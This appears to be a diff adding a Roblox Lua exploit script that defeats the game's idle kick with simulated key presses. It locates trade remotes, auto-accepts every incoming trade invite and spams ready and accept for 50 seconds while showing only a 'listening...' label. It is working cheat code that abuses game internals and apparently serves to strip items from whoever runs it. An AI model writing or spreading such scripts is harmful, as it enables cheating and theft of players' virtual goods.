@@ -1,0 +1,119 @@
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local LocalPlayer = Players.LocalPlayer
+
+
+
+task.spawn(function()
+    while true do
+        task.wait(30)
+        pcall(function()
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
+        end)
+    end
+end)
+
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "LimitedHub"
+gui.ResetOnSpawn = false
+gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 60)
+frame.Position = UDim2.new(0, 10, 0, 10)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+
+Instance.new("UIStroke", frame).Color = Color3.fromRGB(255, 230, 0)
+frame:FindFirstChildOfClass("UIStroke").Thickness = 1.5
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 25)
+title.Position = UDim2.new(0, 0, 0, 5)
+title.BackgroundTransparency = 1
+title.Text = "@zaphub99Discord"
+title.TextColor3 = Color3.fromRGB(255, 230, 0)
+title.TextSize = 14
+title.Font = Enum.Font.GothamBold
+
+local label = Instance.new("TextLabel", frame)
+label.Size = UDim2.new(1, 0, 0, 25)
+label.Position = UDim2.new(0, 0, 0, 28)
+label.BackgroundTransparency = 1
+label.Text = "🎧 listening..."
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextSize = 12
+label.Font = Enum.Font.GothamSemibold
+
+
+local ACCEPT_INVITE_UUID = "57624f2b-8aa9-4974-bb7a-08f058af33ef"
+local READY_UUID = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+local ACCEPT_TRADE_UUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+
+local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+
+local function getRemote(name)
+    local children = Net:GetChildren()
+    for i, obj in ipairs(children) do
+        if obj.Name == name then
+            return children[i + 1]
+        end
+    end
+    return nil
+end
+
+local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
+local createInviteRE = getRemote("RE/TradeService/CreateInvite")
+local readyRE = getRemote("RE/TradeService/Ready")
+local acceptRE = getRemote("RE/TradeService/Accept")
+
+if createInviteRE then
+    createInviteRE.OnClientEvent:Connect(function(sessionId, data)
+        if type(sessionId) ~= "string" or not sessionId:find("-") then return end
+        
+        task.spawn(function()
+            label.Text = "⏳ accepting..."
+            
+            task.wait(1)
+            
+
+            local success, result = pcall(function()
+                return acceptInviteRF:InvokeServer(ACCEPT_INVITE_UUID, sessionId)
+            end)
+            
+            if not success or result == false then
+                label.Text = "❌ error"
+                task.wait(2)
+                label.Text = "🎧 listening..."
+                return
+            end
+            
+            label.Text = "✅ in trade"
+            task.wait(2)
+            
+
+            local startTime = os.clock()
+            while os.clock() - startTime < 50 do
+                pcall(function() readyRE:FireServer(READY_UUID) end)
+                task.wait(0.05)
+                pcall(function() acceptRE:FireServer(ACCEPT_TRADE_UUID) end)
+                task.wait(0.05)
+            end
+            
+            label.Text = "🎧 listening..."
+        end)
+    end)
+else
+    label.Text = "🛑 Remotes not found"
+    label.TextColor3 = Color3.fromRGB(255, 0, 0)
+end
